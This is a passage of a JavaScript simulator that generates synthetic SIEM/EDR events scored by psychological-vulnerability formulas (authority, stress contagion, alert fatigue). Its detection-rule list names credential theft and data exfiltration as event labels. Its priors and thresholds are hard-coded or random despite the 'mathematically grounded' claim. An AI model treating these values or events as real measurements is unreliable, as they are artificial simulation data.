/**
 * SIEM Data Generator - Mathematically Grounded
 *
 * Genera eventi SIEM/SOC/EDR basati su formule matematiche della CPF Math Formalization
 *
 * Implementa:
 * - Detection function: D_i(t) = w₁·R_i(t) + w₂·A_i(t) + w₃·B_i(t)
 * - Bayesian priors e likelihood
 * - Category-specific formulas (Papers 1-10)
 * - Temporal dynamics, social graphs, stress propagation
 *
 * References:
 * - /math-formalization/Paper_1.pdf (Authority)
 * - /math-formalization/Paper_2.pdf (Temporal)
 * - /math-formalization/Paper_3.pdf (Social)
 * - /math-formalization/Paper_4.pdf (Affective)
 * - /math-formalization/Paper_5.pdf (Cognitive)
 * - /math-formalization/Paper_6.pdf (Group)
 * - /math-formalization/Paper_7.pdf (Stress)
 * - /math-formalization/Paper_8.pdf (Unconscious)
 * - /math-formalization/Paper_9.pdf (AI Bias)
 * - /math-formalization/Paper_10.pdf (Convergent)
 */

const crypto = require('crypto');

class SIEMDataGenerator {
  constructor() {
    this.eventCounter = 0;
    this.sessionId = this.generateSessionId();

    // Bayesian priors (from math formalization)
    this.bayesianPriors = this.initializeBayesianPriors();

    // Organizational context (for formulas)
    this.organizationalContext = {
      hierarchyLevels: 10,  // H_max for authority gradient
      timeConstant: 3600,   // τ for temporal decay (seconds)
      lambda: 2.0,          // λ for authority distance decay
      alpha: 2.5,           // α for social proof sensitivity
      beta: 0.6,            // β for similarity weight
      gamma: 0.15           // γ for stress contagion
    };

    // User/asset baselines (for anomaly detection)
    this.baselines = {};

    // Communication graph (for social/group dynamics)
    this.communicationGraph = this.initializeCommunicationGraph();

    // Stress accumulation (for Category 7)
    this.stressLevels = {};
  }

  /**
   * Initialize Bayesian priors P(vulnerable) for each category
   * From mathematical formalization: P(vulnerable) ~ Beta(α, β)
   */
  initializeBayesianPriors() {
    return {
      // Category 1: Authority (Paper 1)
      authority: {
        // P(phishing_clicked|vulnerable) = 0.85
        // P(phishing_clicked|¬vulnerable) = 0.12
        phishing_clicked: { vulnerable: 0.85, safe: 0.12 },
        authority_compliance: { vulnerable: 0.78, safe: 0.20 },
        fear_based_response: { vulnerable: 0.82, safe: 0.15 }
      },

      // Category 2: Temporal (Paper 2)
      temporal: {
        // P(after_hours_access|temporal_vulnerable) = 0.78
        // P(after_hours_access|¬temporal_vulnerable) = 0.25
        after_hours_access: { vulnerable: 0.78, safe: 0.25 },
        weekend_activity: { vulnerable: 0.72, safe: 0.30 },
        deadline_pressure: { vulnerable: 0.80, safe: 0.18 }
      },

      // Category 3: Social (Paper 3)
      social: {
        social_proof_influence: { vulnerable: 0.75, safe: 0.22 },
        reciprocity_exploitation: { vulnerable: 0.70, safe: 0.15 },
        commitment_escalation: { vulnerable: 0.68, safe: 0.20 }
      },

      // Category 4: Affective (Paper 4)
      affective: {
        fear_paralysis: { vulnerable: 0.82, safe: 0.10 },
        emotional_contagion: { vulnerable: 0.73, safe: 0.18 },
        anxiety_response: { vulnerable: 0.77, safe: 0.15 }
      },

      // Category 5: Cognitive (Paper 5)
      cognitive: {
        alert_fatigue: { vulnerable: 0.88, safe: 0.25 },
        decision_fatigue: { vulnerable: 0.80, safe: 0.22 },
        cognitive_overload: { vulnerable: 0.85, safe: 0.20 }
      },

      // Category 6: Group (Paper 6)
      group: {
        groupthink: { vulnerable: 0.75, safe: 0.30 },
        bystander_effect: { vulnerable: 0.70, safe: 0.25 },
        social_loafing: { vulnerable: 0.68, safe: 0.28 }
      },

      // Category 7: Stress (Paper 7)
      stress: {
        acute_stress: { vulnerable: 0.80, safe: 0.20 },
        chronic_stress: { vulnerable: 0.85, safe: 0.15 },
        stress_contagion: { vulnerable: 0.73, safe: 0.22 }
      },

      // Category 8: Unconscious (Paper 8)
      unconscious: {
        repetition_compulsion: { vulnerable: 0.72, safe: 0.18 },
        splitting: { vulnerable: 0.68, safe: 0.25 },
        shadow_projection: { vulnerable: 0.65, safe: 0.22 }
      },

      // Category 9: AI Bias (Paper 9)
      ai: {
        automation_bias: { vulnerable: 0.78, safe: 0.30 },
        anthropomorphization: { vulnerable: 0.70, safe: 0.25 },
        trust_miscalibration: { vulnerable: 0.75, safe: 0.28 }
      },

      // Category 10: Convergent (Paper 10)
      convergent: {
        perfect_storm: { vulnerable: 0.90, safe: 0.05 },
        cascade_failure: { vulnerable: 0.88, safe: 0.08 },
        tipping_point: { vulnerable: 0.92, safe: 0.06 }
      }
    };
  }

  /**
   * Initialize communication graph for social/group dynamics
   * Used in Papers 3, 6, 7 (social influence, group dynamics, stress contagion)
   */
  initializeCommunicationGraph() {
    // Simple graph: nodes = users, edges = communication frequency
    // In production, this would be learned from real communication data
    const users = ['john.smith', 'sarah.jones', 'mike.williams', 'emma.brown',
                   'david.garcia', 'lisa.miller', 'robert.davis', 'maria.rodriguez'];

    const graph = {};
    for (const user of users) {
      graph[user] = {
        connections: {},
        role: this.pickRandom(['executive', 'manager', 'employee']),
        hierarchyLevel: this.pickRandom([1, 3, 5, 8, 10]),
        stressLevel: 0.3,  // Initial baseline
        emotionalState: 0.5  // Neutral
      };
    }

    // Create connections with weights (communication frequency)
    for (const user of users) {
      const numConnections = Math.floor(Math.random() * 4) + 2;
      const otherUsers = users.filter(u => u !== user);

      for (let i = 0; i < numConnections; i++) {
        const target = this.pickRandom(otherUsers);
        graph[user].connections[target] = Math.random() * 0.8 + 0.2;  // 0.2-1.0
      }
    }

    return graph;
  }

  /**
   * Genera un evento SIEM matematicamente fondato
   * Ogni evento include dati per calcolare R_i(t), A_i(t), B_i(t)
   */
  generateEvent(sourceId, eventType, scenario = 'normal', intensity = 'medium') {
    this.eventCounter++;

    const timestamp = new Date();
    const eventId = `${sourceId}-${this.eventCounter}-${crypto.randomBytes(4).toString('hex')}`;

    // Seleziona user e host
    const user = this.selectUser();
    const host = this.generateHostname();

    // Calcola severity base
    const baseSeverity = this.calculateSeverity(eventType, scenario, intensity);

    // Calcola severity numerica [0,1] per formule matematiche
    const numericSeverity = this.severityToNumeric(baseSeverity);

    // Evento base
    const event = {
      id: eventId,
      source: sourceId,
      type: eventType,
      timestamp: timestamp.toISOString(),
      sessionId: this.sessionId,
      scenario,
      severity: baseSeverity,
      numericSeverity: numericSeverity,

      // Metadata comune
      metadata: {
        host: host,
        user: user,
        ip: this.generateIP(),
        process: this.generateProcessName(eventType),
        commandLine: this.generateCommandLine(eventType)
      },

      // Mathematical components (per CPF detection formula)
      mathematical: {
        // R_i(t): Rule-based detection (0 or 1)
        ruleDetection: this.calculateRuleDetection(eventType, user, timestamp),

        // A_i(t): Anomaly score [0,1]
        anomalyScore: this.calculateAnomalyScore(eventType, user, host, timestamp),

        // B_i(t): Bayesian posterior components
        bayesian: this.calculateBayesianComponents(eventType, user, timestamp, numericSeverity),

        // Temporal weight: α = e^(-Δt/τ)
        temporalWeight: 1.0  // Will decay over time
      },

      // Category-specific mathematical data
      categorySpecific: this.generateCategorySpecificData(eventType, user, timestamp, numericSeverity),

      // Dettagli specifici per tipo
      details: this.generateEventDetails(eventType, scenario, intensity),

      // Indicatori di compromissione (IOC)
      ioc: this.generateIOC(eventType, scenario),

      // Contesto
      context: {
        geo: this.generateGeoLocation(),
        device: this.generateDeviceInfo(),
        network: this.generateNetworkInfo(),

        // Temporal context (for Paper 2 formulas)
        temporal: {
          hour: timestamp.getHours(),
          dayOfWeek: timestamp.getDay(),
          isWeekend: timestamp.getDay() >= 5,
          isAfterHours: timestamp.getHours() < 8 || timestamp.getHours() > 18,

          // Circadian performance (Paper 2, Section 3.3)
          circadianPerformance: this.calculateCircadianPerformance(timestamp.getHours())
        }
      }
    };

    // Update stress levels (for Paper 7: Stress contagion)
    this.updateStressLevels(user, numericSeverity);

    return event;
  }

  /**
   * Calculate R_i(t): Rule-based detection (binary 0 or 1)
   * From math formalization: Simple threshold-based rules
   */
  calculateRuleDetection(eventType, user, timestamp) {
    const criticalEvents = [
      'ransomware_activity',
      'data_exfiltration',
      'credential_theft',
      'privilege_escalation'
    ];

    const highSeverityEvents = [
      'malware_detected',
      'phishing_clicked',
      'lateral_movement',
      'brute_force_attack'
    ];

    if (criticalEvents.includes(eventType)) {
      return 1;  // Rule triggered
    }

    if (highSeverityEvents.includes(eventType)) {
      return Math.random() > 0.3 ? 1 : 0;  // 70% trigger rate
    }

    // After-hours access rule
    if (timestamp.getHours() < 6 || timestamp.getHours() > 22) {
      return 1;
    }

    return 0;  // No rule triggered
  }

  /**
   * Calculate A_i(t): Anomaly score [0,1]
   * Compares current behavior to learned baseline
   */
  calculateAnomalyScore(eventType, user, host, timestamp) {
    // Initialize baseline if not exists
    const key = `${user}-${host}`;
    if (!this.baselines[key]) {
      this.baselines[key] = {
        normalHours: [8, 9, 10, 11, 12, 13, 14, 15, 16, 17],
        typicalEvents: ['authentication_success', 'network_traffic_anomaly'],
        avgEventsPerHour: 5,
        lastEventTime: timestamp.getTime()
      };
    }

    const baseline = this.baselines[key];
    const hour = timestamp.getHours();

    // Anomaly factors
    let anomalyScore = 0.0;

    // Time anomaly (outside normal hours)
    if (!baseline.normalHours.includes(hour)) {
      anomalyScore += 0.3;
    }

    // Event type anomaly (unusual event for this user)
    if (!baseline.typicalEvents.includes(eventType)) {
      anomalyScore += 0.4;
    }

    // Frequency anomaly (too many events)
    const timeDelta = (timestamp.getTime() - baseline.lastEventTime) / 1000;  // seconds
    if (timeDelta < 60) {  // More than 1 event per minute
      anomalyScore += 0.3;
    }

    // Update baseline
    baseline.lastEventTime = timestamp.getTime();

    return Math.min(1.0, anomalyScore);
  }

  /**
   * Calculate Bayesian components: P(vulnerable|evidence)
   * From Papers 1, 4, 6: Bayesian inference
   */
  calculateBayesianComponents(eventType, user, timestamp, numericSeverity) {
    // Determine category
    const category = this.determineCategory(eventType);

    // Get priors for this event type
    const priors = this.getBayesianPrior(category, eventType);

    // Prior probability P(vulnerable)
    // In production, this would be learned from historical data
    // For simulation, use organizational baseline
    const priorVulnerable = 0.15;  // 15% baseline vulnerability
    const priorSafe = 1 - priorVulnerable;

    // Likelihood: P(event|vulnerable) and P(event|safe)
    const likelihoodVulnerable = priors.vulnerable;
    const likelihoodSafe = priors.safe;

    // Evidence: P(event) = P(event|vulnerable)·P(vulnerable) + P(event|safe)·P(safe)
    const evidence = (likelihoodVulnerable * priorVulnerable) + (likelihoodSafe * priorSafe);

    // Posterior: P(vulnerable|event)
    const posterior = (likelihoodVulnerable * priorVulnerable) / evidence;

    return {
      prior: priorVulnerable,
      likelihood: likelihoodVulnerable,
      evidence: evidence,
      posterior: posterior,
      category: category
    };
  }

  /**
   * Determine CPF category from event type
   */
  determineCategory(eventType) {
    const categoryMap = {
      'phishing_clicked': 'authority',
      'email_authority_request': 'authority',
      'credential_theft': 'authority',

      'after_hours_access': 'temporal',
      'weekend_activity': 'temporal',
      'deadline_driven_action': 'temporal',

      'social_proof_request': 'social',
      'reciprocity_exploitation': 'social',

      'ransomware_activity': 'affective',
      'malware_detected': 'affective',

      'alert_ignored': 'cognitive',
      'decision_paralysis': 'cognitive',

      'groupthink_indicator': 'group',
      'diffused_responsibility': 'group',

      'stress_indicator': 'stress',
      'burnout_sign': 'stress',

      'pattern_repetition': 'unconscious',
      'splitting_behavior': 'unconscious',

      'ai_override_ignored': 'ai',
      'ai_hallucination': 'ai',

      'cascade_trigger': 'convergent',
      'multi_factor_alignment': 'convergent'
    };

    return categoryMap[eventType] || 'affective';
  }

  /**
   * Get Bayesian prior for category and event type
   */
  getBayesianPrior(category, eventType) {
    const categoryPriors = this.bayesianPriors[category];

    if (!categoryPriors) {
      // Default priors
      return { vulnerable: 0.5, safe: 0.5 };
    }

    // Try exact match
    for (const [key, values] of Object.entries(categoryPriors)) {
      if (eventType.includes(key) || key.includes(eventType)) {
        return values;
      }
    }

    // Default for category
    return Object.values(categoryPriors)[0] || { vulnerable: 0.5, safe: 0.5 };
  }

  /**
   * Generate category-specific mathematical data
   * Implements formulas from Papers 1-10
   */
  generateCategorySpecificData(eventType, user, timestamp, numericSeverity) {
    const category = this.determineCategory(eventType);

    const data = {
      category: category,
      indicators: []
    };

    switch(category) {
      case 'authority':
        // Paper 1: Authority-Based Vulnerabilities
        data.authority = this.generateAuthorityData(user, eventType);
        break;

      case 'temporal':
        // Paper 2: Temporal Vulnerabilities
        data.temporal = this.generateTemporalData(timestamp, numericSeverity);
        break;

      case 'social':
        // Paper 3: Social Influence
        data.social = this.generateSocialData(user);
        break;

      case 'affective':
        // Paper 4: Affective Vulnerabilities
        data.affective = this.generateAffectiveData(user, numericSeverity);
        break;

      case 'cognitive':
        // Paper 5: Cognitive Overload
        data.cognitive = this.generateCognitiveData(user);
        break;

      case 'group':
        // Paper 6: Group Dynamics
        data.group = this.generateGroupData(user);
        break;

      case 'stress':
        // Paper 7: Stress Response
        data.stress = this.generateStressData(user, numericSeverity);
        break;

      case 'unconscious':
        // Paper 8: Unconscious Processes
        data.unconscious = this.generateUnconsciousData(user, eventType);
        break;

      case 'ai':
        // Paper 9: AI-Specific Bias
        data.ai = this.generateAIData(user);
        break;

      case 'convergent':
        // Paper 10: Critical Convergent States
        data.convergent = this.generateConvergentData(user, numericSeverity);
        break;
    }

    return data;
  }

  /**
   * Paper 1: Authority-Based Vulnerabilities
   *
   * Formulas:
   * - Authority Gradient: AG(i,j) = (H_j - H_i)/H_max · e^(-d(i,j)/λ)
   * - Compliance Rate: C_r(t,w) = Σ(E_i) / Σ(R_i)
   */
  generateAuthorityData(user, eventType) {
    const userNode = this.communicationGraph[user];

    // Simulate authority request from higher hierarchy
    const possibleAuthorities = Object.keys(this.communicationGraph).filter(u =>
      this.communicationGraph[u].hierarchyLevel > userNode.hierarchyLevel
    );

    const authorityUser = possibleAuthorities.length > 0
      ? this.pickRandom(possibleAuthorities)
      : user;

    const authorityNode = this.communicationGraph[authorityUser];

    // Calculate Authority Gradient: AG(i,j) = (H_j - H_i)/H_max · e^(-d(i,j)/λ)
    const hierarchyDiff = authorityNode.hierarchyLevel - userNode.hierarchyLevel;
    const organizationalDistance = 1;  // Simplified: direct report
    const lambda = this.organizationalContext.lambda;
    const hMax = this.organizationalContext.hierarchyLevels;

    const authorityGradient = (hierarchyDiff / hMax) * Math.exp(-organizationalDistance / lambda);

    // Compliance probability (higher gradient = more compliance)
    const complianceProbability = 0.5 + (authorityGradient * 0.4);

    return {
      authorityUser: authorityUser,
      userHierarchyLevel: userNode.hierarchyLevel,
      authorityHierarchyLevel: authorityNode.hierarchyLevel,
      hierarchyDiff: hierarchyDiff,
      organizationalDistance: organizationalDistance,
      authorityGradient: authorityGradient,
      complianceProbability: complianceProbability,

      // Indicators triggered
      indicators: hierarchyDiff >= 3 ? ['1.1', '1.2', '1.5'] : ['1.1']
    };
  }

  /**
   * Paper 2: Temporal Vulnerabilities
   *
   * Formulas:
   * - Circadian Performance: P_circ(h) = P₀ + A₁·cos(2π(h-φ₁)/24) + A₂·cos(4π(h-φ₂)/24)
   * - Hyperbolic Discounting: V(R,D) = R / (1 + k·D)
   * - Vigilance Decay: V(t) = V₀·e^(-αt) + V_min
   */
  generateTemporalData(timestamp, numericSeverity) {
    const hour = timestamp.getHours();

    // Circadian performance (Paper 2, Section 3.3)
    const circadianPerf = this.calculateCircadianPerformance(hour);

    // Hyperbolic discounting (Paper 2, Section 2.1)
    // Simulates time pressure: higher k = more present-biased
    const k = 0.5;  // Discounting rate
    const delayDays = 1;  // Simulated: threat in 1 day
    const riskValue = numericSeverity;
    const discountedValue = riskValue / (1 + k * delayDays);

    // Vigilance decay (Paper 2, Section 3.5)
    // Assume 4-hour shift
    const shiftDuration = 4;  // hours
    const alpha = 0.15;  // decay rate per hour
    const v0 = 1.0;
    const vMin = 0.3;
    const vigilance = v0 * Math.exp(-alpha * shiftDuration) + vMin;

    return {
      hour: hour,
      circadianPerformance: circadianPerf,
      hyperbolicDiscounting: {
        k: k,
        delayDays: delayDays,
        discountedValue: discountedValue
      },
      vigilanceDecay: {
        alpha: alpha,
        shiftDuration: shiftDuration,
        currentVigilance: vigilance
      },

      // Temporal windows
      isAfterHours: hour < 8 || hour > 18,
      isWeekend: timestamp.getDay() >= 5,
      isLowPerformanceWindow: circadianPerf < 0.6,

      // Indicators triggered
      indicators: circadianPerf < 0.6 ? ['2.1', '2.7', '2.4'] : ['2.1']
    };
  }

  /**
   * Circadian Performance Function (Paper 2)
   * P_circ(h) = P₀ + A₁·cos(2π(h-φ₁)/24) + A₂·cos(4π(h-φ₂)/24)
   */
  calculateCircadianPerformance(hour) {
    const p0 = 0.7;   // Baseline
    const a1 = 0.2;   // Primary amplitude
    const a2 = 0.1;   // Secondary amplitude
    const phi1 = 14;  // Peak at 14:00 (2 PM)
    const phi2 = 15;  // Post-lunch dip at 15:00 (3 PM)

    const term1 = a1 * Math.cos(2 * Math.PI * (hour - phi1) / 24);
    const term2 = a2 * Math.cos(4 * Math.PI * (hour - phi2) / 24);

    return p0 + term1 + term2;
  }

  /**
   * Paper 3: Social Influence Vulnerabilities
   *
   * Formulas:
   * - Social Proof: SP(p,s) = p^α/(p^α + (1-p)^α) · s^β
   * - Reciprocity Imbalance: R_i(t) = Σ [(F_j→i - F_i→j) / (F_j→i + F_i→j + ε)]
   */
  generateSocialData(user) {
    const userNode = this.communicationGraph[user];

    // Social Proof (Paper 3, Section 4.2)
    const proportionClaiming = Math.random() * 0.9 + 0.1;  // 10-100% "others did it"
    const similarity = Math.random() * 0.8 + 0.2;  // 20-100% similarity
    const alpha = this.organizationalContext.alpha;  // 2.5
    const beta = this.organizationalContext.beta;    // 0.6

    const socialProofInfluence =
      (Math.pow(proportionClaiming, alpha) /
       (Math.pow(proportionClaiming, alpha) + Math.pow(1 - proportionClaiming, alpha)))
      * Math.pow(similarity, beta);

    // Reciprocity Imbalance (Paper 3, Section 4.4)
    // Simulate favor imbalance
    let reciprocityImbalance = 0;
    const connections = Object.keys(userNode.connections);

    for (const other of connections) {
      const favorsReceived = Math.random() * 10;
      const favorsGiven = Math.random() * 10;
      const epsilon = 0.1;

      reciprocityImbalance += (favorsReceived - favorsGiven) / (favorsReceived + favorsGiven + epsilon);
    }

    reciprocityImbalance = reciprocityImbalance / connections.length;

    return {
      socialProof: {
        proportionClaiming: proportionClaiming,
        similarity: similarity,
        influence: socialProofInfluence
      },
      reciprocity: {
        imbalance: reciprocityImbalance,
        connectionCount: connections.length
      },

      // Indicators triggered
      indicators: socialProofInfluence > 0.7 ? ['3.1', '3.2', '3.3'] : ['3.1']
    };
  }

  /**
   * Paper 4: Affective Vulnerabilities
   *
   * Formulas:
   * - Fear-Induced Paralysis: F_i(t) = [P_threat(t) · V_vulnerability(t)] / [C_control(t) + ε]
   * - Emotional Contagion: dE_i/dt = -α_i·E_i + Σ_j β_ij·f(E_j - E_i) + ξ_i(t)
   */
  generateAffectiveData(user, numericSeverity) {
    const userNode = this.communicationGraph[user];

    // Fear-Induced Paralysis (Paper 4, Section 2.3)
    const pThreat = numericSeverity;  // Perceived threat from event
    const vVulnerability = 0.5;  // Personal vulnerability (baseline)
    const cControl = 0.6;  // Perceived control (training, tools)
    const epsilon = 0.1;

    const fearParalysis = (pThreat * vVulnerability) / (cControl + epsilon);

    // Emotional Contagion (Paper 4, Section 5.2)
    // Calculate emotional state from network
    let emotionalInfluence = 0;
    const connections = Object.keys(userNode.connections);

    for (const other of connections) {
      const otherNode = this.communicationGraph[other];
      const betaIJ = userNode.connections[other];  // Connection strength
      const emotionDiff = otherNode.emotionalState - userNode.emotionalState;
      const tanhGamma = Math.tanh(0.5 * emotionDiff);  // f(x) = tanh(γ·x)

      emotionalInfluence += betaIJ * tanhGamma;
    }

    // Update user's emotional state (simplified Euler step)
    const alphaI = 0.1;  // Decay rate
    const dt = 1;  // Time step
    const newEmotionalState = userNode.emotionalState +
      dt * (-alphaI * userNode.emotionalState + emotionalInfluence + numericSeverity);

    userNode.emotionalState = Math.max(0, Math.min(1, newEmotionalState));

    return {
      fearParalysis: {
        perceivedThreat: pThreat,
        vulnerability: vVulnerability,
        perceivedControl: cControl,
        fearIndex: fearParalysis
      },
      emotionalContagion: {
        currentState: userNode.emotionalState,
        influenceFromNetwork: emotionalInfluence,
        connectionCount: connections.length
      },

      // Indicators triggered
      indicators: fearParalysis > 0.7 ? ['4.2', '4.5', '4.9'] : ['4.1']
    };
  }

  /**
   * Paper 5: Cognitive Overload Vulnerabilities
   *
   * Formulas:
   * - Alert Fatigue Index: AFI(t) = 1 - H(Response|Alert) / H(Response)
   * - Working Memory Load: WM_load(t) = Σ w_i·C_i(t)·e^(-λt_i)
   */
  generateCognitiveData(user) {
    // Simulate alert history for this user
    const alertsLast24h = Math.floor(Math.random() * 200) + 50;  // 50-250 alerts
    const actioned = Math.floor(alertsLast24h * (Math.random() * 0.3 + 0.1));  // 10-40% response

    // Alert Fatigue Index (Paper 5, Section 3.1)
    // Simplified: based on response rate
    const responseRate = actioned / alertsLast24h;
    const afi = 1 - responseRate;  // High AFI = low response = fatigue

    // Working Memory Load (Paper 5, Section 2.2)
    // Simulate multiple tasks
    const tasks = [
      { weight: 0.3, complexity: 0.8, timeActive: 30 },  // minutes
      { weight: 0.4, complexity: 0.6, timeActive: 60 },
      { weight: 0.3, complexity: 0.5, timeActive: 15 }
    ];

    const lambda = 0.05;  // Decay rate (1/minutes)
    let wmLoad = 0;

    for (const task of tasks) {
      wmLoad += task.weight * task.complexity * Math.exp(-lambda * task.timeActive);
    }

    return {
      alertFatigue: {
        alertsLast24h: alertsLast24h,
        actioned: actioned,
        responseRate: responseRate,
        fatigueIndex: afi
      },
      workingMemory: {
        load: wmLoad,
        taskCount: tasks.length,
        overloaded: wmLoad > 0.7  // Miller's 7±2 threshold
      },

      // Indicators triggered
      indicators: afi > 0.7 ? ['5.1', '5.2', '5.3'] : ['5.1']
    };
  }

  /**
   * Paper 6: Group Dynamic Vulnerabilities
   *
   * Formulas:
   * - Groupthink Entropy: H_opinions(t) = -Σ p_i(t)·log₂ p_i(t)
   * - Bystander Effect: P_response(i,n) = P_base · (1/√n) · Responsibility_i
   */
  generateGroupData(user) {
    // Simulate team opinions
    const teamSize = Math.floor(Math.random() * 8) + 3;  // 3-10 people
    const opinions = ['approve', 'reject', 'neutral'];
    const opinionDistribution = {
      approve: Math.random(),
      reject: Math.random(),
      neutral: Math.random()
    };

    // Normalize
    const total = opinionDistribution.approve + opinionDistribution.reject + opinionDistribution.neutral;
    for (const key in opinionDistribution) {
      opinionDistribution[key] /= total;
    }

    // Groupthink Entropy (Paper 6, Section 3.2)
    let entropy = 0;
    for (const key in opinionDistribution) {
      const p = opinionDistribution[key];
      if (p > 0) {
        entropy += -p * Math.log2(p);
      }
    }

    // Low entropy (<0.5) = groupthink
    const groupthinkDetected = entropy < 0.5;

    // Bystander Effect (Paper 6, Section 4.3)
    const pBase = 0.8;  // Base response probability
    const responsibility = 1.0 / teamSize;  // Diffused
    const pResponse = pBase * (1 / Math.sqrt(teamSize)) * responsibility;

    return {
      groupthink: {
        teamSize: teamSize,
        opinionEntropy: entropy,
        detected: groupthinkDetected,
        dominantOpinion: Object.keys(opinionDistribution).reduce((a, b) =>
          opinionDistribution[a] > opinionDistribution[b] ? a : b
        )
      },
      bystanderEffect: {
        teamSize: teamSize,
        responseProbability: pResponse,
        diffusedResponsibility: responsibility
      },

      // Indicators triggered
      indicators: groupthinkDetected ? ['6.1', '6.2', '6.7'] : ['6.7']
    };
  }

  /**
   * Paper 7: Stress Response Vulnerabilities
   *
   * Formulas:
   * - Allostatic Load: AL(t) = ∫₀ᵗ e^(-λ(t-τ))·S(τ) dτ
   * - Stress Contagion: dS_i/dt = -λ_i·S_i + Σ_j α_ij·S_j·(1-S_i) + β_i·E_i(t)
   */
  generateStressData(user, numericSeverity) {
    const userNode = this.communicationGraph[user];

    // Initialize stress level if not exists
    if (!this.stressLevels[user]) {
      this.stressLevels[user] = {
        current: 0.3,  // Baseline
        history: [0.3]
      };
    }

    const stressData = this.stressLevels[user];

    // Allostatic Load (Paper 7, Section 2.1)
    // Simplified discrete approximation of integral
    const lambda = 1 / (7 * 24);  // 1 week decay
    let allostaticLoad = 0;

    for (let i = 0; i < stressData.history.length; i++) {
      const tau = i;  // Time steps ago
      allostaticLoad += Math.exp(-lambda * tau) * stressData.history[i];
    }

    // Stress Contagion (Paper 7, Section 5.3)
    // dS_i/dt = -λ_i·S_i + Σ_j α_ij·S_j·(1-S_i) + β_i·E_i(t)
    const lambdaI = 0.1;  // Decay rate
    const betaI = 0.5;    // External stressor weight
    const externalStress = numericSeverity;

    let contagionTerm = 0;
    const connections = Object.keys(userNode.connections);

    for (const other of connections) {
      const otherStress = this.stressLevels[other]?.current || 0.3;
      const alphaIJ = userNode.connections[other] * 0.3;  // Contagion strength

      contagionTerm += alphaIJ * otherStress * (1 - stressData.current);
    }

    // Update stress level (Euler step)
    const dt = 1;
    const dS = -lambdaI * stressData.current + contagionTerm + betaI * externalStress;
    const newStress = Math.max(0, Math.min(1, stressData.current + dt * dS));

    stressData.current = newStress;
    stressData.history.push(newStress);

    // Keep only last 168 hours (1 week)
    if (stressData.history.length > 168) {
      stressData.history.shift();
    }

    return {
      allostaticLoad: {
        value: allostaticLoad,
        chronic: allostaticLoad > 5.0  // Threshold for chronic stress
      },
      stressContagion: {
        currentStress: newStress,
        contagionFromNetwork: contagionTerm,
        externalStressor: externalStress
      },

      // Indicators triggered
      indicators: newStress > 0.7 ? ['7.1', '7.2', '7.5'] : ['7.1']
    };
  }

  /**
   * Paper 8: Unconscious Process Vulnerabilities
   *
   * Pattern detection for repetition compulsion, splitting, etc.
   */
  generateUnconsciousData(user, eventType) {
    // These patterns require historical analysis
    // Simplified simulation: random pattern detection

    const patterns = {
      repetitionCompulsion: Math.random() > 0.8,  // 20% chance
      splitting: Math.random() > 0.85,            // 15% chance
      shadowProjection: Math.random() > 0.9       // 10% chance
    };

    return {
      patterns: patterns,

      // Indicators triggered
      indicators: patterns.repetitionCompulsion ? ['8.3', '8.7'] :
                  patterns.splitting ? ['8.2'] :
                  patterns.shadowProjection ? ['8.5'] : []
    };
  }

  /**
   * Paper 9: AI-Specific Bias Vulnerabilities
   *
   * Formulas:
   * - Automation Bias: AB(t) = max(0, [OR_expected - OR(t)] / OR_expected)
   */
  generateAIData(user) {
    // Simulate AI system interaction
    const aiRecommendations = Math.floor(Math.random() * 50) + 10;  // 10-60 recommendations
    const userOverrides = Math.floor(Math.random() * 5);  // 0-5 overrides

    const overrideRate = userOverrides / aiRecommendations;
    const expectedOverrideRate = 0.12;  // 12% healthy skepticism

    // Automation Bias (Paper 9, Section 3.1)
    const automationBias = Math.max(0, (expectedOverrideRate - overrideRate) / expectedOverrideRate);

    return {
      automationBias: {
        aiRecommendations: aiRecommendations,
        userOverrides: userOverrides,
        overrideRate: overrideRate,
        expectedRate: expectedOverrideRate,
        biasIndex: automationBias
      },

      // Indicators triggered
      indicators: automationBias > 0.7 ? ['9.1', '9.2', '9.5'] : ['9.1']
    };
  }

  /**
   * Paper 10: Critical Convergent States
   *
   * Formulas:
   * - Perfect Storm Index: PSI(t) = Π_i (1 + γ_i · V_i(t))
   */
  generateConvergentData(user, numericSeverity) {
    const userNode = this.communicationGraph[user];

    // Simulate vulnerability scores across categories
    const vulnerabilities = {
      authority: Math.random() * 0.5 + 0.3,
      temporal: Math.random() * 0.5 + 0.2,
      social: Math.random() * 0.5 + 0.2,
      affective: Math.random() * 0.5 + 0.3,
      cognitive: Math.random() * 0.5 + 0.4
    };

    // Perfect Storm Index (Paper 10, Section 2.1)
    // PSI(t) = Π_i (1 + γ_i · V_i(t))
    let psi = 1.0;
    const gamma = 0.8;  // Weight for category contributions

    for (const category in vulnerabilities) {
      psi *= (1 + gamma * vulnerabilities[category]);
    }

    // PSI > 3.0 indicates convergent danger
    const convergentState = psi > 3.0;

    // Count aligned categories (>0.6 vulnerability)
    const alignedCategories = Object.values(vulnerabilities).filter(v => v > 0.6).length;

    return {
      perfectStormIndex: {
        value: psi,
        convergent: convergentState,
        alignedCategories: alignedCategories
      },
      vulnerabilities: vulnerabilities,

      // Indicators triggered
      indicators: convergentState ? ['10.1', '10.2', '10.3', '10.4'] : []
    };
  }

  /**
   * Update stress levels for stress contagion network
   */
  updateStressLevels(user, severity) {
    if (!this.stressLevels[user]) {
      this.stressLevels[user] = {
        current: 0.3,
        history: [0.3]
      };
    }

    // Add external stressor
    const currentStress = this.stressLevels[user].current;
    const newStress = Math.min(1.0, currentStress + severity * 0.1);
    this.stressLevels[user].current = newStress;
  }

  /**
   * Select user from communication graph
   */
  selectUser() {
    const users = Object.keys(this.communicationGraph);
    return this.pickRandom(users);
  }

  /**
   * Convert severity string to numeric [0,1]
   */
  severityToNumeric(severity) {
    const map = {
      'info': 0.1,
      'low': 0.3,
      'medium': 0.5,
      'high': 0.7,
      'critical': 0.9
    };
    return map[severity] || 0.5;
  }

  // ===== ORIGINAL HELPER METHODS (preserved) =====

  generateSessionId() {
    return `sim-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  calculateSeverity(eventType, scenario, intensity) {
    const baseSeverity = {
      'authentication_failed': 'low',
      'authentication_success': 'info',
      'network_traffic_anomaly': 'medium',
      'malware_detected': 'high',
      'policy_violation': 'medium',
      'privilege_escalation': 'high',
      'data_exfiltration': 'critical',
      'suspicious_process': 'medium',
      'ransomware_activity': 'critical',
      'phishing_clicked': 'high',
      'lateral_movement': 'high',
      'brute_force_attack': 'high',
      'insider_threat_indicator': 'high',
      'credential_theft': 'critical',
      'email_authority_request': 'high',
      'after_hours_access': 'medium',
      'weekend_activity': 'low',
      'alert_ignored': 'medium',
      'ai_override_ignored': 'medium'
    };

    let severity = baseSeverity[eventType] || 'medium';

    if (scenario !== 'normal' && intensity === 'high') {
      const escalation = {
